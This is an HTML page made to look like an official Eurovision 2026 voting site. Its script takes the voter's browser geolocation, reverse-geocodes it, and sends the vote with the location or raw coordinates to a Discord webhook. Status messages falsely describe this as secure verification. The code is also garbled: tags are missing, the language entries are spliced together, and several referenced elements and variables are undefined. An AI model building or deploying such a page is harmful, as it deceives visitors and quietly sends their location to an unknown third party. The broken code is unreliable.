<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eurovision Song Contest 2026</title>
    <style>
        :root {
            --text-main: #ffffff;
            --text-muted: rgba(255, 255, 255, 0.65);
            --euro-pink: #ff007f;
            --success-green: #00ffaa;
            
            /* Sauberes, klares Apple-Glas (Ohne fehlerhafte SVG-Verzerrungen) */
            --glass-bg: rgba(255, 255, 255, 0.06);
            --glass-border: rgba(255, 255, 255, 0.2);
            --card-glow: 0px 30px 60px rgba(0, 0, 0, 0.5), 0px 0px 40px -10px rgba(255, 0, 127, 0.5);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            
            /* Farbintensiver Wellen-Hintergrund aus dem Originalbild */
            background: 
                radial-gradient(circle at 85% 85%, rgba(114, 30, 153, 0.9) 0%, transparent 55%),
                radial-gradient(circle at 15% 20%, rgba(0, 240, 255, 0.25) 0%, transparent 50%),
                radial-gradient(circle at 50% 50%, rgba(80, 19, 117, 0.75) 0%, transparent 70%),
                linear-gradient(145deg, #05010d 0%, #0d041f 40%, #22083a 75%, #380754 100%);
            background-attachment: fixed;
            overflow-x: hidden;
            padding-bottom: 60px;
        }

        /* Navigationsleiste */
        .nav-bar {
            width: calc(100% - 48px);
            max-width: 1100px;
            height: 54px;
            margin-top: 24px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 27px;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 24px;
            font-size: 13px;
            font-weight: 500;
        }

        .lang-selector {
            display: flex;
            align-items: center;
            gap: 6px;
            background: transparent;
            border: none;
            color: var(--text-main);
            font-family: inherit;
            font-size: 13px;
            outline: none;
            cursor: pointer;
        }
        
        .lang-selector option {
            background: #190a2e;
            color: #fff;
        }

        .nav-center {
            font-weight: 700;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            font-size: 11px;
            opacity: 0.9;
        }

        .nav-menu-icon {
            display: flex;
            flex-direction: column;
            gap: 4px;
            width: 16px;
        }
        .nav-menu-icon span {
            display: block;
            height: 2px;
            background: white;
            width: 100%;
            border-radius: 1px;
        }

        /* Content Layout */
        .viewport-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: auto 0;
            padding: 40px 24px 0 24px;
            width: 100%;
            max-width: 480px;
        }

        /* Saubere Glassmorphism Karte mit perfekt geglätteten Kanten */
        .clean-glass-card {
            background: var(--glass-bg);
            backdrop-filter: blur(30px) saturate(140%);
            -webkit-backdrop-filter: blur(30px) saturate(140%);
            border: 1.5px solid var(--glass-border);
            border-radius: 36px; 
            box-shadow: var(--card-glow);
            width: 100%;
            height: 420px;
            padding: 28px 24px;
            display: flex;
            flex-direction: column;
            margin-bottom: 35px;
        }

        /* Suchfeld */
        .search-container {
            margin-bottom: 16px;
        }

        .search-bar {
            width: 100%;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 14px;
            padding: 12px 16px;
            color: var(--text-main);
            font-family: inherit;
            font-size: 14px;
            outline: none;
            transition: all 0.2s ease;
        }

        .search-bar:focus {
            background: rgba(255, 255, 255, 0.14);
            border-color: rgba(255, 255, 255, 0.4);
        }

        .search-bar::placeholder {
            color: rgba(255, 255, 255, 0.35);
        }

        /* Scrollbereich für die Länderliste */
        .options-scroll-area {
            flex-grow: 1;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 10px;
            padding-right: 4px;
        }

        .options-scroll-area::-webkit-scrollbar {
            width: 6px;
        }
        .options-scroll-area::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 3px;
        }

        /* Listen-Zeilen */
        .vote-row {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 14px 18px;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
        }

        .vote-row:hover {
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.08);
        }

        /* Custom Radio Buttons exakt wie im neuen Screenshot */
        .vote-row input[type="radio"] {
            appearance: none;
            -webkit-appearance: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.35);
            border-radius: 50%;
            position: absolute;
            right: 18px;
            outline: none;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .vote-row input[type="radio"]:checked {
            border-color: var(--euro-pink);
            background: var(--euro-pink);
            box-shadow: inset 0 0 0 4px rgba(255, 255, 255, 0.95);
        }

        .vote-row.selected {
            border-color: rgba(255, 255, 255, 0.65);
            background: rgba(255, 255, 255, 0.12);
        }

        .iso-code {
            font-size: 13px;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.45);
            width: 38px;
            letter-spacing: 0.5px;
        }

        .country-name {
            font-size: 16px;
            font-weight: 600;
        }

        .no-results {
            text-align: center;
            color: var(--text-muted);
            font-size: 14px;
            margin-top: 40px;
        }

        /* Typografie */
        .headline {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -0.5px;
            text-align: center;
            margin-bottom: 16px;
            line-height: 1.25;
        }

        .body-narrative {
            color: var(--text-muted);
            font-size: 15px;
            text-align: center;
            line-height: 1.6;
            max-width: 440px;
            margin-bottom: 30px;
        }

        /* Button */
        .submit-btn {
            background: #ffffff;
            color: #0b0214;
            border: none;
            border-radius: 20px;
            padding: 18px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            max-width: 320px;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .submit-btn:hover:not(:disabled) {
            opacity: 0.92;
            transform: translateY(-1px);
        }

        .submit-btn:disabled {
            background: rgba(255, 255, 255, 0.12);
            color: rgba(255, 255, 255, 0.25);
            box-shadow: none;
            cursor: not-allowed;
        }

        #realtime-monitor {
            margin-top: 18px;
            font-size: 13px;
            font-weight: 500;
            color: var(--text-muted);
            text-align: center;
        }
    </style>
</head>
<body>

<div class="nav-bar">
    <div class="nav-left">
        🌐 
        <select class="lang-selector" id="langSelector" onchange="switchLanguage(this.value)">
            <option value="en">English</option>
            <option value="de">Deutsch</option>
            <option value="bar">Bairisch</option>
            <option value="gsw">Schwiizerdütsch</option>
            <option value="es">Español</option>
            <option value="sv">Svenska</option>
            <option value="zh">简体中文</option>
        </select>
    </div>
    <div class="nav-center">Eurovision</div>
    <div class="nav-menu-icon">
        <span></span>
        <span></span>
    </div>
</div>

<div class="viewport-wrapper">
    
    <div class="clean-glass-card" id="cardFrame">
        <div class="search-container">
            <input type="text" id="searchBar" class="search-bar" placeholder="Land suchen..." oninput="filterCountries()">
        </div>
        <div class="options-scroll-area" id="scrollStack">
            </div>

    <div id="realtime-monitor">Bitte treffen Sie oben eine Auswahl</div>
</div>

    const dictionary = {
        en: {
            headline: "Cast your vote for the Grand Final",

        bar: {
            headline: "Stimm ob für des grousse Finale",
            body: "Vergelt's Gott für dei Unnerstützung und dass'd beim diesjährigen Eurovision Song Contest mitmachst! Dei Begeisterung und dei Stimm entscheidn direkt, wer gwinnt.",
            cta: "Stimm obgem",

            success: "✅ Passt! Dei Stimm is ordnungsgemäß zöhrt worn!",
            fail: "❌ Des hod ned hiekaut. Terminal-Status prüfa.",
            networkError: "❌聯 Netzwak-Fehla beim Vabindungsaufbau."
        },
        gsw: {
            headline: "Stimm ab für das grosse Finale",
            body: "Merci viumau für dini Unterstützig und d'Teilnahm am diesjährige Eurovision Song Contest! Di Enthusiasmus und dini Stimm entscheide direkt über de Gwünner.",
            cta: "Stimm abgäh",
            searchPlaceholder: "Land sueche...",
            noResults: "Kei Länder gfunne",

            noResults: "No se encontraron coincidencias",

            locating: "Solicitando parámetros de verificación localizados...",
            resolving: "Mapeando coordenadas al nodo público más cercano...",

            fail: "❌ Verificación rechazada. Verifique el estado del terminal.",
            networkError: "❌ Error crítico de conexión."
        },
        sv: {
            headline: "Avge din röst i den stora finalen",
            body: "Tack för ditt stöd och deltagande i årets Eurovision Song Contest! Er entusiasm och engagemang avgör vinnaren direkt.",
            cta: "Avge röst",
            searchPlaceholder: "Sök land...",
            noResults: "Inga länder matchar din sökning",
            initialStatus: "Vänligen gör ett val ovan",
            ready: "Redo att registrera valet på ",
            locating: "Begär lokaliserade verifieringsparametrar...",
            resolving: "Kartlägger koordinater till närmaste publika hubb...",
            sending: "Slutför säker paketöverföring...",
            success: "✅ Transaktionen slutförd. Din röst har registrerats!",
            fail: "❌ Verifiering nekad. Kontrollera terminalens status.",
            networkError: "❌ Kritiskt handskakningsfel."
        },
        zh: {
            headline: "在总决赛中投下您的一票",
            body: "感谢您对今年欧洲歌唱大赛的支持与参与！您的热情与投入将直接决定最终的冠军归属。",
            cta: "投出此票",
            searchPlaceholder: "搜索国家...",
            noResults: "没有找到匹配的国家",
            initialStatus: "请在上方进行选择",
            ready: "准备好登记以下选项的投票：",
            locating: "正在请求本地化验证参数...",
            resolving: "正在将坐标映射到最近的公共节点...",
            sending: "正在完成安全数据包中继...",
            success: "✅ 交易完成。您的选票已被成功记录！",
            fail: "❌ 验证被拒绝。请检查终端状态。",
            networkError: "❌ 关键握手错误。"
        }
    };

    let activeLang = "de"; // Standardmäßig auf Deutsch gesetzt wie im Screenshot
    let currentSelectedCountry = "";

    function buildCountryList(list) {
        const stack = document.getElementById("scrollStack");
        stack.innerHTML = "";

        if (list.length === 0) {
            stack.innerHTML = `<div class="no-results">${dictionary[activeLang].noResults}</div>`;
            return;
        }

        list.forEach(item => {
            const isSelected = item.name === currentSelectedCountry;
            const row = document.createElement("label");
            row.className = `vote-row ${isSelected ? 'selected' : ''}`;
            row.onclick = () => selectRow(row, item.name);

            row.innerHTML = `
                <span class="iso-code">${item.code}</span>
                <span class="country-name">${item.name}</span>
                <input type="radio" name="esc" value="${item.name}" ${isSelected ? 'checked' : ''}>
            `;
            stack.appendChild(row);
        });
    }

    function filterCountries() {
        const query = document.getElementById("searchBar").value.toLowerCase();
        const filtered = globalCountries.filter(c => c.name.toLowerCase().includes(query));
        buildCountryList(filtered);
    }

    function selectRow(element, countryName) {
        document.querySelectorAll('.vote-row').forEach(row => row.classList.remove('selected'));
        element.classList.add('selected');
        
        const radio = element.querySelector('input[type="radio"]');
        radio.checked = true;
        currentSelectedCountry = countryName;

        document.getElementById('ctaBtn').disabled = false;
        document.getElementById('realtime-monitor').innerText = `${dictionary[activeLang].ready}${countryName}`;
    }

    function switchLanguage(langKey) {
        activeLang = langKey;
        const data = dictionary[langKey];
        
        document.getElementById("uiHeadline").innerText = data.headline;
        document.getElementById("uiBody").innerText = data.body;
        document.getElementById("searchBar").placeholder = data.searchPlaceholder;
        document.getElementById("ctaBtn").innerText = data.cta;
        
        if(!currentSelectedCountry) {
            document.getElementById("realtime-monitor").innerText = data.initialStatus;
        } else {
            document.getElementById("realtime-monitor").innerText = `${data.ready}${currentSelectedCountry}`;
        }
        filterCountries();
    }

    async function initiateTransmission() {
        const monitor = document.getElementById('realtime-monitor');
        const ctaBtn = document.getElementById('ctaBtn');

        if (!currentSelectedCountry) return;
        
        ctaBtn.disabled = true;
        monitor.innerText = dictionary[activeLang].locating;

        if (!navigator.geolocation) {
            transmitPayload(currentSelectedCountry, "Unknown Location (API Unsupported)");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                monitor.innerText = dictionary[activeLang].resolving;

                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const parsed = await res.json();
                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Region";
                    
                    monitor.innerText = dictionary[activeLang].sending;
                    transmitPayload(currentSelectedCountry, region);
                } catch (e) {
                    transmitPayload(currentSelectedCountry, `Coords: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
                }
            },
            (err) => {
                transmitPayload(currentSelectedCountry, "Anonymous Location (Denied)");
            }
        );
    }

    async function transmitPayload(voteSelection, verifiedOrigin) {
        const monitor = document.getElementById('realtime-monitor');
        const ctaBtn = document.getElementById('ctaBtn');
        
        const messageBody = {
            embeds: [{
                title: "🗳️ Clean Glass Ballot Received",
                color: 16711807, 
                fields: [
                    { name: "Voted For", value: `**${voteSelection}**`, inline: true },
                    { name: "Voter Origin", value: `🌍 ${verifiedOrigin}`, inline: true }
                ],
                footer: { text: "ESC Production Node • Crystal Glass Engine" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const delivery = await fetch(discordEndpoint, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(messageBody)
            });

            if (delivery.ok) {
                monitor.innerText = dictionary[activeLang].success;
                monitor.style.color = "var(--success-green)";
                document.getElementById('cardFrame').style.setProperty('--card-glow', '0px 30px 60px rgba(0, 0, 0, 0.5), 0px 0px 40px -10px rgba(0, 255, 170, 0.6)');
            } else {
                monitor.innerText = dictionary[activeLang].fail;
                monitor.style.color = "#ff4d4d";
                ctaBtn.disabled = false;
            }
        } catch (networkError) {
            monitor.innerText = dictionary[activeLang].networkError;
            monitor.style.color = "#ff4d4d";
            ctaBtn.disabled = false;
        }
    }

    // Initiale Liste generieren (Auf Standard-Deutsch eingestellt)
    document.getElementById("langSelector").value = "de";
    buildCountryList(globalCountries);
</script>
